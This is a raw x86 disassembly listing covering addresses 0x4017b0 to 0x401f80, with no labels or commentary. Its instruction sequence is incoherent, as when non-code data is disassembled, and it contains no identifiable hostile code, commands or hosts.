  4017b0:	add    BYTE PTR [eax],cl
  4017b2:	popa   
  4017b3:	inc    edx
  4017b4:	cmp    al,al
  4017b6:	adc    DWORD PTR [edx],ecx
  4017b8:	add    BYTE PTR [eax],al
  4017ba:	or     BYTE PTR [eax+0xd423011],dh
  4017c0:	mov    BYTE PTR ds:0x80b80640,dl
  4017c6:	sub    BYTE PTR [eax],al
  4017c8:	add    BYTE PTR [edx],cl
  4017ca:	inc    eax
  4017cb:	add    al,BYTE PTR [ecx+0x50]
  4017ce:	xchg   ecx,eax
  4017cf:	add    bh,bh
  4017d1:	adc    eax,0x438318
  4017d6:	sub    BYTE PTR [eax],0x0
  4017d9:	add    eax,DWORD PTR [esp+eax*4]
  4017dc:	xchg   esp,eax
  4017dd:	rol    BYTE PTR [eax],0x28
  4017e0:	add    BYTE PTR [edx],al
  4017e2:	adc    BYTE PTR [eax],al
  4017e4:	xor    BYTE PTR [eax],0x10
  4017e7:	push   eax
  4017e8:	mov    BYTE PTR [eax+edx*2+0x44],dl
  4017ec:	stos   BYTE PTR es:[edi],al
  4017ed:	pushf  
  4017ee:	inc    edx
  4017ef:	dec    esp
  4017f0:	adc    eax,DWORD PTR [eax]
  4017f2:	add    DWORD PTR [ecx+0x4008ac00],ecx
  4017f8:	push   eax
  4017f9:	add    ah,BYTE PTR [ebp+0x1]
  4017fc:	mov    WORD PTR [edx+0x3c],es
  4017ff:	xchg   ecx,eax
  401800:	mov    ds:0x1005a020,al
  401805:	adc    ah,dl
  401807:	sub    BYTE PTR [eax],cl
  401809:	fdivr  DWORD PTR [esi]
  40180b:	add    DWORD PTR [eax+ecx*8+0x41],eax
  40180f:	inc    eax
  401810:	add    BYTE PTR [eax+0x6],bh
  401813:	add    eax,0x72c0c580
  401818:	inc    ecx
  401819:	add    al,0x0
  40181b:	dec    ecx
  40181c:	sbb    BYTE PTR [eax],bh
  40181e:	or     al,al
  401820:	ror    DWORD PTR [eax-0x7fbfff7c],0x85
  401827:	push   esi
  401828:	add    BYTE PTR [ecx],cl
  40182a:	adc    BYTE PTR [edx],al
  40182c:	push   esp
  40182d:	sub    BYTE PTR [esi+0x60c30028],dl
  401833:	loop   0x401846
  401835:	add    BYTE PTR [edx+edx*1],al
  401838:	inc    eax
  401839:	inc    edx
  40183a:	dec    ecx
  40183b:	add    esp,DWORD PTR [ebp-0x3bff9bff]
  401841:	inc    eax
  401842:	adc    al,BYTE PTR [eax+0x1]
  401845:	add    BYTE PTR [eax],al
  401847:	add    al,BYTE PTR [ecx]
  401849:	or     BYTE PTR [edx],cl
  40184b:	add    al,0x84
  40184d:	inc    edx
  40184e:	add    eax,0x12a000
  401853:	add    eax,0xc3450084
  401858:	cmp    DWORD PTR [edx],ecx
  40185a:	add    dl,BYTE PTR [ebx]
  40185c:	adc    BYTE PTR [eax],al
  40185e:	add    BYTE PTR [ecx+0x2841242],cl
  401864:	add    al,0x21
  401866:	and    ah,dl
  401868:	add    cl,BYTE PTR [eax]
  40186a:	push   ss
  40186b:	es inc ecx
  40186d:	nop
  40186e:	add    al,BYTE PTR [ecx+0x21930a3a]
  401874:	inc    eax
  401875:	sbb    DWORD PTR [ecx],esp
  401877:	xchg   ecx,eax
  401878:	add    BYTE PTR [edx],ah
  40187a:	and    BYTE PTR [eax],al
  40187c:	mov    al,ds:0x90490422
  401881:	and    BYTE PTR [edx+0x23e0015],ah
  401887:	or     BYTE PTR [ecx+0x48],bl
  40188a:	inc    eax
  40188b:	rcl    DWORD PTR [ecx],0x4
  40188e:	and    al,BYTE PTR [eax+esi*1-0x7c]
  401892:	shr    DWORD PTR [edx],0x44
  401895:	in     eax,0x2
  401897:	add    DWORD PTR [eax],ecx
  401899:	and    BYTE PTR [eax],al
  40189b:	add    ah,BYTE PTR [eax+0x50]
  40189e:	inc    eax
  40189f:	and    DWORD PTR [esi+eax*2],0x451d13
  4018a6:	add    al,0xc
  4018a8:	adc    al,0x0
  4018aa:	fs popa 
  4018ac:	or     DWORD PTR ds:0x14,edx
  4018b2:	inc    eax
  4018b3:	and    dl,BYTE PTR [eax]
  4018b5:	cwde   
  4018b6:	aam    0xc8
  4018b8:	xchg   BYTE PTR [ebx+0x51446208],bh
  4018be:	pop    ecx
  4018bf:	xchg   ebp,eax
  4018c0:	add    BYTE PTR [eax],al
  4018c2:	rol    BYTE PTR [eax],0x90
  4018c5:	adc    DWORD PTR [eax+esi*4],esp
  4018c8:	and    BYTE PTR [ebx],bl
  4018ca:	dec    ecx
  4018cb:	mov    esi,0x80618101
  4018d0:	mov    WORD PTR [eax-0x37f6e7db],fs
  4018d6:	cwde   
  4018d7:	add    BYTE PTR [eax+0x44],dl
  4018da:	xor    DWORD PTR [eax],ecx
  4018dc:	add    DWORD PTR [ecx],eax
  4018de:	call   0x2290:0x6ce13044
  4018e5:	pop    ebp
  4018e7:	xchg   esp,eax
  4018e8:	adc    al,BYTE PTR [eax-0x2ffff5e0]
  4018ee:	push   esp
  4018ef:	rol    DWORD PTR [edi],1
  4018f1:	add    BYTE PTR [eax+eax*1],cl
  4018f4:	adc    BYTE PTR [edx+0x41908288],al
  4018fa:	and    BYTE PTR [edx],cl
  4018fc:	inc    ecx
  4018fd:	or     BYTE PTR [eax+ebx*2+0x3089a2c0],dl
  401904:	add    BYTE PTR [eax+eax*1-0x5ffdffe0],al
  40190b:	ret    0x2019
  40190e:	inc    eax
  40190f:	or     BYTE PTR [eax-0x3d],ah
  401912:	adc    eax,0x10ba0891
  401917:	and    al,BYTE PTR [ecx*2-0x3f9db780]
  40191e:	nop
  40191f:	sub    al,BYTE PTR [edx-0x76ff3f5e]
  401925:	or     bh,BYTE PTR [eax]
  401927:	add    BYTE PTR [eax],dl
  401929:	add    BYTE PTR [eax],dl
  40192b:	inc    eax
  40192c:	inc    esp
  40192d:	add    BYTE PTR [eax],cl
  40192f:	adc    al,BYTE PTR [esp+ecx*1]
  401932:	push   ebx
  401933:	pusha  
  401934:	mov    al,0x4
  401936:	push   edx
  401937:	sbb    BYTE PTR [esi+0x210a6000],al
  40193d:	mov    BYTE PTR [eax],ah
  40193f:	add    DWORD PTR [eax],ecx
  401941:	add    DWORD PTR [edx+eax*8],eax
  401944:	push   edx
  401945:	pusha  
  401946:	adc    al,al
  401948:	pop    es
  401949:	cwde   
  40194a:	add    BYTE PTR [ecx],cl
  40194c:	and    BYTE PTR [eax],dl
  40194e:	or     BYTE PTR [eax+eax*1],ah
  401951:	inc    eax
  401952:	bound  eax,QWORD PTR [ecx-0x227eff91]
  401958:	sbb    BYTE PTR [eax],al
  40195a:	and    al,0x88
  40195c:	add    eax,DWORD PTR [eax+0x191858d2]
  401962:	nop
  401963:	and    BYTE PTR [ecx+0x10001620],cl
  401969:	add    BYTE PTR [ebp+0x6e29000d],al
  40196f:	or     ah,al
  401971:	add    BYTE PTR [ecx],dl
  401973:	add    al,0x4d
  401975:	add    al,0x86
  401977:	adc    BYTE PTR [edx+0x1],0x0
  40197b:	ror    DWORD PTR [eax],0x54
  40197e:	and    BYTE PTR [ecx],ah
  401980:	add    BYTE PTR [eax],al
  401982:	push   edx
  401983:	add    eax,0x68140800
  401988:	fs and al,0x90
  40198b:	test   BYTE PTR [eax],al
  40198d:	adc    BYTE PTR [eax],al
  40198f:	nop
  401990:	add    BYTE PTR [esi],bh
  401992:	and    al,0x92
  401994:	or     BYTE PTR [esp+0x49],al
  401998:	or     DWORD PTR [edx],esi
  40199a:	loope  0x4019e8
  40199c:	add    BYTE PTR [esi],ch
  40199e:	push   cs
  40199f:	test   DWORD PTR es:[ecx],edx
  4019a2:	and    BYTE PTR [edx+ecx*8],al
  4019a5:	enter  0x2802,0xc1
  4019a9:	xor    al,0x8
  4019ab:	nop
  4019ac:	mov    al,ds:0x10a0010e
  4019b1:	pusha  
  4019b2:	adc    al,0x6
  4019b4:	and    DWORD PTR [ebx+0x500d510],eax
  4019ba:	bound  edx,QWORD PTR [edx]
  4019bc:	add    eax,0x81895942
  4019c1:	or     al,0x29
  4019c3:	mov    eax,ds:0x200c0806
  4019c8:	sub    BYTE PTR [ecx],0x18
  4019cb:	or     cl,BYTE PTR [eax]
  4019cd:	inc    edx
  4019ce:	add    eax,DWORD PTR [eax-0x40]
  4019d1:	nop
  4019d2:	adc    BYTE PTR [esp+ebp*1+0xe005940],al
  4019d9:	mov    ds:0x21042e44,eax
  4019de:	add    bl,ah
  4019e0:	pop    eax
  4019e1:	add    al,0x17
  4019e3:	push   ss
  4019e4:	adc    al,0x41
  4019e6:	or     BYTE PTR [eax+0x30],ah
  4019e9:	push   eax
  4019ea:	and    BYTE PTR [eax],cl
  4019ec:	add    al,0x1
  4019ee:	add    edx,0xd0120400
  4019f4:	mov    BYTE PTR [esi+0x12200c81],al
  4019fa:	cmp    edx,DWORD PTR [ebx]
  4019fc:	add    BYTE PTR [edx+0x38401b00],0x79
  401a03:	or     BYTE PTR [edx-0x5ff1ff3c],ah
  401a09:	rol    DWORD PTR [eax],0x11
  401a0c:	push   esi
  401a0d:	mov    bl,BYTE PTR ds:0x40
  401a13:	adc    al,al
  401a15:	add    BYTE PTR [ecx],0x8a
  401a18:	add    al,0x72
  401a1a:	add    DWORD PTR ds:0xe80dd10,ecx
  401a20:	mov    BYTE PTR [ebp+esi*4+0x15cb8842],cl
  401a27:	and    BYTE PTR [eax],al
  401a29:	or     al,BYTE PTR [eax]
  401a2b:	add    BYTE PTR [eax],al
  401a2d:	adc    ebx,esp
  401a2f:	or     BYTE PTR [eax+0x40014520],dh
  401a35:	and    BYTE PTR [eax],al
  401a37:	and    BYTE PTR [edx+0x40],ah
  401a3a:	adc    BYTE PTR [edx+ebp*1],cl
  401a3d:	xor    al,BYTE PTR [eax+0x19]
  401a40:	inc    eax
  401a41:	mov    eax,0x2aa10424
  401a46:	inc    esp
  401a47:	inc    ebx
  401a48:	sub    BYTE PTR [ecx],0x18
  401a4b:	mov    ds:0x80220428,al
  401a50:	add    al,0x10
  401a52:	add    BYTE PTR [edx],0xe1
  401a55:	add    dh,BYTE PTR [edx-0x7af3877a]
  401a5b:	adc    BYTE PTR [eax],al
  401a5d:	adc    al,BYTE PTR [eax]
  401a5f:	adc    DWORD PTR [eax+ecx*2+0x3011c0d0],esi
  401a66:	mov    al,ds:0x7100710
  401a6b:	pusha  
  401a6c:	push   eax
  401a6d:	or     BYTE PTR [ebx+eax*1-0x7673e5ff],0xa0
  401a75:	dec    eax
  401a76:	dec    eax
  401a77:	add    eax,0x809504a4
  401a7c:	add    BYTE PTR [eax-0x79beebe5],cl
  401a82:	dec    esi
  401a83:	and    ah,al
  401a85:	mov    BYTE PTR [eax+0x41],0x0
  401a89:	daa    
  401a8a:	inc    edx
  401a8b:	mov    DWORD PTR [eax+0x64],ebp
  401a8e:	bound  ebx,QWORD PTR [ecx+0x800420]
  401a94:	add    al,BYTE PTR [eax]
  401a96:	or     al,0x5f
  401a98:	and    BYTE PTR [ecx+edx*2],dh
  401a9b:	add    BYTE PTR [edi],0x4
  401a9e:	mov    dh,0x8
  401aa0:	adc    BYTE PTR ds:0x1a446260,al
  401aa6:	add    BYTE PTR [edx],dl
  401aa8:	adc    DWORD PTR [esi+0x52116f4],0x80816000
  401ab2:	xlat   BYTE PTR ds:[ebx]
  401ab3:	or     al,0xc
  401ab5:	enter  0x410,0x81
  401ab9:	pop    esp
  401aba:	and    al,0x90
  401abc:	fs jno 0x401a43
  401abf:	mov    BYTE PTR [ecx+edx*1],ch
  401ac2:	add    DWORD PTR [esi+0x20404402],0x12001604
  401acc:	xchg   edi,eax
  401acd:	add    BYTE PTR [ecx],0xe8
  401ad0:	or     BYTE PTR [esi],dl
  401ad2:	jb     0x401aaf
  401ad4:	add    al,0xf1
  401ad6:	test   BYTE PTR [eax],al
  401ad8:	rol    BYTE PTR [ecx+0x88920c],1
  401ade:	adc    BYTE PTR [edx+0x0],al
  401ae1:	jo     0x401ae5
  401ae3:	and    eax,0x80800000
  401ae8:	rol    DWORD PTR [eax],1
  401aea:	or     BYTE PTR [eax],al
  401aec:	and    BYTE PTR [eax],cl
  401aee:	inc    edx
  401aef:	xchg   esp,eax
  401af0:	adc    DWORD PTR [ebx-0x7c],eax
  401af3:	add    ah,BYTE PTR [esi]
  401af5:	xor    BYTE PTR [eax],0x80
  401af8:	inc    eax
  401af9:	and    BYTE PTR [eax+eax*4],ch
  401afc:	mov    eax,ds:0x603e0420
  401b01:	inc    ecx
  401b02:	adc    cl,BYTE PTR [edx+0xc]
  401b05:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  401b07:	push   ss
  401b08:	add    BYTE PTR [eax],ah
  401b0a:	ror    DWORD PTR [eax],0x3
  401b0d:	and    BYTE PTR [eax+0x1a],0x1
  401b11:	or     DWORD PTR [eax+0x12],eax
  401b14:	adc    al,0x20
  401b16:	sub    DWORD PTR [eax+esi*2],eax
  401b19:	nop
  401b1a:	shl    BYTE PTR [eax+eax*1],1
  401b1d:	scas   eax,DWORD PTR es:[edi]
  401b1e:	cmp    DWORD PTR [esi],0xb5000701
  401b24:	and    DWORD PTR [esp+edx*2+0x4b5181e6],eax
  401b2b:	push   esp
  401b2c:	nop
  401b2d:	dec    eax
  401b2e:	inc    ecx
  401b2f:	add    BYTE PTR [eax],0x62
  401b32:	fwait
  401b33:	jo     0x401af5
  401b35:	add    al,BYTE PTR [eax+0x5a]
  401b38:	and    BYTE PTR [eax],al
  401b3a:	mov    BYTE PTR es:[eax],al
  401b3d:	add    DWORD PTR [ebp+0x4],eax
  401b40:	and    al,0x82
  401b42:	and    BYTE PTR [eax],cl
  401b44:	fadd   DWORD PTR [ebp+0x0]
  401b47:	mov    cl,BYTE PTR [eax+eax*4+0x4]
  401b4b:	or     BYTE PTR [ebx],al
  401b4d:	pop    eax
  401b4e:	jo     0x401ae1
  401b50:	and    BYTE PTR [edx],dh
  401b52:	add    BYTE PTR [ebx],dh
  401b54:	push   cs
  401b55:	add    DWORD PTR ds:0x868a2113,ecx
  401b5b:	retf   0x9040
  401b5e:	add    al,ah
  401b60:	mov    eax,0x250800
  401b65:	mov    DWORD PTR [eax],ecx
  401b67:	add    al,BYTE PTR [eax]
  401b69:	sbb    al,0xc1
  401b6b:	pop    es
  401b6c:	adc    eax,0x4a240e3
  401b71:	add    eax,0x4838440
  401b76:	add    BYTE PTR [eax+eax*2-0x7bfff1cf],0x5
  401b7e:	add    BYTE PTR [edx-0x4fbfd340],al
  401b84:	add    BYTE PTR [eax],ah
  401b86:	or     al,0x21
  401b88:	and    ecx,DWORD PTR [eax]
  401b8a:	xor    eax,edx
  401b8c:	xor    al,0x32
  401b8e:	add    BYTE PTR [edx+eiz*1],dl
  401b91:	add    BYTE PTR [eax],al
  401b93:	add    ah,BYTE PTR [eax+0x1]
  401b96:	mov    dl,0xc0
  401b98:	aas    
  401b99:	inc    ecx
  401b9a:	sbb    DWORD PTR [eax],edx
  401b9c:	add    DWORD PTR [eax],esp
  401b9e:	add    BYTE PTR [eax+0x0],al
  401ba1:	add    eax,0x44080740
  401ba6:	add    BYTE PTR [eax],dl
  401ba8:	xchg   ecx,eax
  401ba9:	xor    eax,0x91101007
  401bae:	and    BYTE PTR [esp+ebp*2],al
  401bb1:	and    eax,0x60e0c
  401bb6:	push   cs
  401bb7:	sbb    cl,BYTE PTR [eax]
  401bb9:	add    al,al
  401bbb:	pop    ebp
  401bbc:	or     BYTE PTR [eax+0x0],0x43
  401bc0:	pusha  
  401bc1:	mov    BYTE PTR [esp+eax*1],cl
  401bc4:	xor    DWORD PTR [edx+0x19],0x6210408a
  401bcb:	les    esp,FWORD PTR [eax+0x60]
  401bce:	sbb    BYTE PTR [eax],al
  401bd0:	xchg   BYTE PTR [eax+0x44102814],ah
  401bd6:	inc    edx
  401bd7:	and    BYTE PTR [eax+0x8222c00],cl
  401bdd:	add    BYTE PTR [ecx-0x7ffac7ce],ah
  401be3:	push   cs
  401be4:	add    DWORD PTR [ebp+0x49],0xe
  401be8:	add    BYTE PTR [ecx+0x8012098],al
  401bee:	add    eax,0xdc011513
  401bf3:	add    BYTE PTR [edx],dl
  401bf5:	add    eax,DWORD PTR [eax]
  401bf7:	add    DWORD PTR [ecx],0xffffff8a
  401bfa:	loopne 0x401c1c
  401bfc:	xchg   esp,eax
  401bfd:	add    BYTE PTR [eax+eiz*1],cl
  401c00:	jl     0x401b98
  401c02:	inc    ecx
  401c03:	dec    edx
  401c04:	add    DWORD PTR [esp+edx*1],0x0
  401c08:	add    al,0x2
  401c0a:	push   ebp
  401c0b:	lea    edx,[ecx]
  401c0d:	sbb    eax,DWORD PTR [eax+0x2b530400]
  401c13:	add    al,0x80
  401c15:	inc    eax
  401c16:	push   ecx
  401c17:	adc    BYTE PTR [eax+eax*1-0x6fffcbaf],0xc8
  401c1f:	and    BYTE PTR [eax],al
  401c21:	or     al,0x4a
  401c23:	add    BYTE PTR [eax-0x7a5eff37],0x9
  401c2a:	push   eax
  401c2b:	and    BYTE PTR [edx],ah
  401c2d:	add    BYTE PTR [ecx+eiz*4],ah
  401c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c31:	add    DWORD PTR [edx+0x8],edx
  401c34:	add    cl,cl
  401c36:	xor    BYTE PTR [ecx],dl
  401c38:	inc    eax
  401c39:	inc    eax
  401c3a:	mov    BYTE PTR [esp+ecx*1],ah
  401c3d:	xor    BYTE PTR [ebx],al
  401c3f:	and    DWORD PTR [eax],esp
  401c41:	test   BYTE PTR [edx],cl
  401c43:	add    BYTE PTR [eax+edx*2],al
  401c46:	add    BYTE PTR [eax],bh
  401c48:	and    BYTE PTR [edx+0x6302a038],ch
  401c4e:	xor    BYTE PTR [eax-0x60],al
  401c51:	add    al,0x85
  401c53:	imul   eax,DWORD PTR [esp+ecx*4],0x808082b1
  401c5a:	nop
  401c5b:	dec    ecx
  401c5c:	fs nop
  401c5e:	adc    DWORD PTR [eax],eax
  401c60:	push   eax
  401c61:	add    eax,0x80000000
  401c66:	or     ah,BYTE PTR [eax+0xa]
  401c69:	pop    eax
  401c6a:	mov    BYTE PTR [eax-0x7c],al
  401c6d:	or     al,BYTE PTR [eax]
  401c6f:	adc    BYTE PTR [eax+esi*1+0x1540012c],0x24
  401c77:	sub    DWORD PTR [esi],eax
  401c79:	add    DWORD PTR [eax],esp
  401c7b:	hlt    
  401c7c:	add    BYTE PTR [eax-0x7bbfedec],dl
  401c82:	dec    ecx
  401c83:	shl    BYTE PTR fs:[eax],0x30
  401c87:	add    DWORD PTR [eax],ebp
  401c89:	xor    BYTE PTR [edx],cl
  401c8b:	push   esp
  401c8c:	sbb    DWORD PTR [ebx+0x11c41060],esp
  401c92:	push   0x10958040
  401c97:	add    BYTE PTR [eax],al
  401c99:	add    BYTE PTR [ecx-0x7afdf7f0],0x21
  401ca0:	and    BYTE PTR [eax],al
  401ca2:	sub    al,0x4
  401ca4:	inc    ebx
  401ca5:	add    al,0x44
  401ca7:	mov    BYTE PTR [edx+0x11],ch
  401caa:	xor    BYTE PTR [eax+ecx*1],0x47
  401cae:	xchg   edx,eax
  401caf:	add    BYTE PTR [ecx],al
  401cb1:	adc    BYTE PTR [eax],dl
  401cb3:	nop
  401cb4:	add    BYTE PTR [eax],0xc6
  401cb7:	add    al,0x10
  401cb9:	inc    ebx
  401cba:	mov    WORD PTR ds:0x2888e130,es
  401cc0:	sbb    al,BYTE PTR [edx+0x53]
  401cc3:	add    BYTE PTR [esi-0x6ff7df40],al
  401cc9:	or     eax,DWORD PTR [edx]
  401ccb:	xor    DWORD PTR [ecx+0x47],0x503a108
  401cd2:	add    BYTE PTR ds:0x5504f36c,al
  401cd8:	add    BYTE PTR [ecx+edi*4+0x14e02291],0x0
  401ce0:	mov    eax,ds:0x8688c04a
  401ce5:	and    al,BYTE PTR [eax]
  401ce7:	adc    BYTE PTR [eax],0x12
  401cea:	mov    BYTE PTR [eax+0x8],al
  401ced:	shl    DWORD PTR [eax],1
  401cef:	les    esi,FWORD PTR [eax]
  401cf1:	call   0x1040:0x21d88424
  401cf8:	test   al,0x14
  401cfa:	and    BYTE PTR [ebx],cl
  401cfc:	add    BYTE PTR [eax-0x5a],0x40
  401d00:	mov    al,BYTE PTR [eax]
  401d02:	or     eax,eax
  401d04:	and    BYTE PTR [eax-0x6e447d0c],ah
  401d0a:	dec    ecx
  401d0b:	add    BYTE PTR [eax],0x50
  401d0e:	inc    esp
  401d0f:	adc    BYTE PTR [eax],ch
  401d11:	push   es
  401d12:	mov    WORD PTR [edx],es
  401d14:	add    al,0x30
  401d16:	ror    BYTE PTR [eax+0x40],0x77
  401d1a:	dec    eax
  401d1b:	dec    eax
  401d1c:	add    BYTE PTR [ecx],cl
  401d1e:	xor    edx,DWORD PTR [ecx]
  401d20:	pop    esp
  401d21:	add    ah,BYTE PTR [eax]
  401d23:	adc    al,0x41
  401d25:	sub    BYTE PTR [eax+0x19],0x9
  401d29:	mov    BYTE PTR [eax+0x43429468],al
  401d2f:	or     BYTE PTR [eax+0x20d22401],dl
  401d35:	mov    BYTE PTR [edx+0x60024],al
  401d3b:	mov    al,ds:0x4009c008
  401d40:	sub    BYTE PTR [eax+eax*8+0x2],ch
  401d44:	add    BYTE PTR [eax-0x4e575ff8],al
  401d4a:	add    BYTE PTR [eax-0x3fbc6b60],dl
  401d50:	add    al,al
  401d52:	sub    BYTE PTR [eax],al
  401d54:	inc    edi
  401d55:	add    BYTE PTR [eax+eax*2],dl
  401d58:	add    DWORD PTR [ecx],eax
  401d5a:	nop
  401d5b:	adc    BYTE PTR [edx],0x4c
  401d5e:	or     al,0x24
  401d60:	add    eax,0x214b0
  401d65:	adc    DWORD PTR [eax],esp
  401d67:	add    BYTE PTR [ecx],cl
  401d69:	add    edx,DWORD PTR [ecx]
  401d6b:	add    BYTE PTR [eax+0x23],bl
  401d6e:	add    BYTE PTR [eax],cl
  401d70:	mov    BYTE PTR [ecx+0x4],dh
  401d73:	add    BYTE PTR [eax],ah
  401d75:	xor    ah,BYTE PTR [eax]
  401d77:	and    al,0x82
  401d79:	mov    ds:0x80690080,eax
  401d7e:	adc    eax,DWORD PTR [edx]
  401d80:	or     ah,BYTE PTR [ebx+0x70]
  401d83:	inc    eax
  401d84:	sbb    BYTE PTR ds:0x18a3c440,dh
  401d8a:	or     BYTE PTR [eax],0xad
  401d8d:	add    eax,DWORD PTR [eax]
  401d8f:	and    al,0xa8
  401d91:	and    BYTE PTR [eax+edx*1-0x7c87db1f],ah
  401d98:	or     al,bl
  401d9a:	sar    bl,1
  401d9c:	add    al,BYTE PTR [ebx]
  401d9e:	and    BYTE PTR [edx],cl
  401da0:	add    BYTE PTR [esi+ecx*1],al
  401da3:	sbb    BYTE PTR [esp],al
  401da6:	rol    BYTE PTR [edx],0x86
  401da9:	add    DWORD PTR [edi],0x102428c1
  401daf:	adc    BYTE PTR [ecx],ah
  401db1:	test   BYTE PTR [eax],dl
  401db3:	and    BYTE PTR [eax],al
  401db5:	loopne 0x401dc1
  401db7:	sbb    DWORD PTR [eax],esp
  401db9:	inc    eax
  401dba:	cmp    BYTE PTR [eax+0x46104140],dl
  401dc0:	add    BYTE PTR [eax+eiz*1+0x6040660],al
  401dc7:	and    BYTE PTR [eax],cl
  401dc9:	add    BYTE PTR [edx-0x7dfe7dff],dl
  401dcf:	adc    eax,DWORD PTR [esi-0x73f22beb]
  401dd5:	hlt    
  401dd6:	add    BYTE PTR [eax],cl
  401dd8:	sub    al,BYTE PTR [eax+0x20]
  401ddb:	add    BYTE PTR [eax],0x32
  401dde:	jo     0x401d80
  401de0:	repz add DWORD PTR [ebx+edi*4+0x2],ecx
  401de5:	push   0xffffff80
  401de7:	loopne 0x401d89
  401de9:	or     BYTE PTR [ecx],cl
  401deb:	sbb    al,0x42
  401ded:	adc    DWORD PTR [ecx],eax
  401def:	cwde   
  401df0:	call   0x20d52e1e
  401df5:	inc    ebx
  401df6:	rol    BYTE PTR [eax],0x4
  401df9:	dec    eax
  401dfa:	and    eax,0x224820c0
  401dff:	rol    BYTE PTR [eax],1
  401e01:	or     ah,BYTE PTR [edi+0x28]
  401e04:	or     al,0x34
  401e06:	or     BYTE PTR [eax+0x18],al
  401e09:	data16 add BYTE PTR [eax],cl
  401e0c:	adc    ah,BYTE PTR [esi-0x7e]
  401e0f:	add    DWORD PTR [eax+0x9a20904],edx
  401e15:	adc    al,0x4
  401e17:	xor    BYTE PTR es:[ecx],cl
  401e1a:	pusha  
  401e1b:	and    BYTE PTR [ecx+0x22],cl
  401e1e:	inc    esp
  401e1f:	push   ecx
  401e20:	or     bl,BYTE PTR [ebp-0x77b1f7fa]
  401e26:	add    BYTE PTR [eax+edx*1],cl
  401e29:	add    DWORD PTR [eax],eax
  401e2b:	add    al,BYTE PTR [edx-0x6f]
  401e2e:	sbb    ch,BYTE PTR [eax]
  401e30:	arpl   WORD PTR [eax+0xa],ax
  401e33:	inc    edi
  401e34:	enter  0xa820,0x55
  401e38:	add    ah,al
  401e3a:	nop
  401e3b:	adc    BYTE PTR [eax+0x37000008],0x88
  401e42:	push   cs
  401e43:	push   ebp
  401e44:	add    BYTE PTR [eax],al
  401e46:	call   0x4801:0x8222793
  401e4d:	inc    ecx
  401e4e:	add    DWORD PTR [eax],eax
  401e50:	mov    al,ds:0x80420a28
  401e55:	xchg   DWORD PTR [ebx],esp
  401e57:	enter  0x8400,0x15
  401e5b:	adc    BYTE PTR [ecx+0x1b],al
  401e5e:	adc    BYTE PTR [edx+0x3],dh
  401e61:	inc    ecx
  401e62:	add    dh,ch
  401e64:	add    edx,eax
  401e66:	adc    BYTE PTR [ecx+0x30],dl
  401e69:	inc    esp
  401e6a:	adc    DWORD PTR [ebx],eax
  401e6c:	xor    dl,BYTE PTR [ecx+0x80400c0]
  401e72:	enter  0x401a,0x2
  401e76:	mov    BYTE PTR [edx],ah
  401e78:	adc    BYTE PTR [eax],dl
  401e7a:	add    BYTE PTR [ebx],dl
  401e7c:	or     ah,BYTE PTR [eax+0x3480547b]
  401e82:	jp     0x401ed9
  401e84:	mov    BYTE PTR [eax],0xe
  401e87:	lock add al,0x10
  401e8a:	and    esp,DWORD PTR [ecx+0x45]
  401e8d:	rol    al,0xb1
  401e90:	add    DWORD PTR [eax+0x10],eax
  401e93:	and    eax,0xc51381
  401e98:	mov    ss,WORD PTR [eax]
  401e9a:	mov    DWORD PTR [edx],eax
  401e9c:	xor    BYTE PTR [eax-0x5cfa7de0],0xe8
  401ea3:	xor    al,0xc5
  401ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ea6:	pop    edx
  401ea7:	or     al,0x14
  401ea9:	or     BYTE PTR [eax],al
  401eab:	mov    BYTE PTR [eax+0x8],ah
  401eae:	adc    al,0x80
  401eb0:	adc    DWORD PTR ds:0x18015,ebx
  401eb6:	inc    eax
  401eb7:	inc    eax
  401eb8:	add    eax,DWORD PTR [eax+0x4031007]
  401ebe:	adc    eax,0x41a1870
  401ec3:	add    DWORD PTR [eax+edx*4+0x48764a00],0x4010e2
  401ece:	dec    eax
  401ecf:	add    eax,DWORD PTR [eax+0x50003081]
  401ed5:	sub    al,0x0
  401ed7:	add    DWORD PTR [esi+0x2],ebp
  401eda:	add    BYTE PTR [eax+eax*1],ah
  401edd:	pop    esp
  401ede:	pop    ecx
  401edf:	adc    bl,al
  401ee1:	adc    al,BYTE PTR [eax+0x40]
  401ee4:	inc    esp
  401ee5:	push   esp
  401ee6:	sbb    BYTE PTR [eax],al
  401ee8:	inc    esp
  401ee9:	add    al,0x8
  401eeb:	inc    edx
  401eec:	or     al,0xa8
  401eee:	add    al,0x43
  401ef0:	test   BYTE PTR [eax+0x448a6444],al
  401ef6:	ror    al,1
  401ef8:	add    BYTE PTR [eax],al
  401efa:	inc    ebx
  401efb:	add    BYTE PTR [eax],dl
  401efd:	adc    al,0x41
  401eff:	sbb    BYTE PTR [eax],0x68
  401f02:	pop    ss
  401f03:	mov    al,ah
  401f05:	add    cl,BYTE PTR [eax]
  401f07:	sub    ah,BYTE PTR [eax+0xd]
  401f0a:	add    BYTE PTR [eax],0x14
  401f0d:	popa   
  401f0e:	adc    eax,ecx
  401f10:	and    al,0xa5
  401f12:	add    dl,BYTE PTR ds:0x10000188
  401f18:	sbb    BYTE PTR [eax+0x200199],dl
  401f1e:	or     BYTE PTR [eax],cl
  401f20:	mov    BYTE PTR [eax],al
  401f22:	xchg   esp,eax
  401f23:	pop    eax
  401f24:	jae    0x401eab
  401f26:	add    al,BYTE PTR [ebp-0x57]
  401f29:	add    BYTE PTR [eax+eax*4],ah
  401f2c:	adc    DWORD PTR [ecx+0x2],edx
  401f2f:	push   ss
  401f30:	push   eax
  401f31:	add    BYTE PTR [eax+0x3867c308],al
  401f37:	enter  0xf221,0x11
  401f3b:	mov    WORD PTR [esp],es
  401f3e:	and    DWORD PTR [esp+eax*1],eax
  401f41:	pop    es
  401f42:	dec    ecx
  401f43:	or     BYTE PTR [edi+0x40],0x0
  401f47:	rol    BYTE PTR [eax],0x2a
  401f4a:	mov    eax,ds:0x8081288
  401f4f:	push   eax
  401f50:	add    dl,dl
  401f52:	pop    es
  401f53:	pop    eax
  401f54:	rcl    BYTE PTR ds:0xc048080c,0x21
  401f5b:	add    BYTE PTR [eax],al
  401f5d:	inc    eax
  401f5e:	jmp    0x2022:0x5c4002
  401f65:	add    BYTE PTR [edx+0x0],cl
  401f68:	ror    BYTE PTR [edi],0x88
  401f6b:	mov    eax,0x8da1010d
  401f70:	sbb    dh,0x80
  401f73:	mov    dh,BYTE PTR [eax]
  401f75:	xchg   ecx,eax
  401f76:	hlt    
  401f77:	or     BYTE PTR [eax],al
  401f79:	or     DWORD PTR [eax+eax*1-0x3ec59ec8],esi
  401f80:	nop
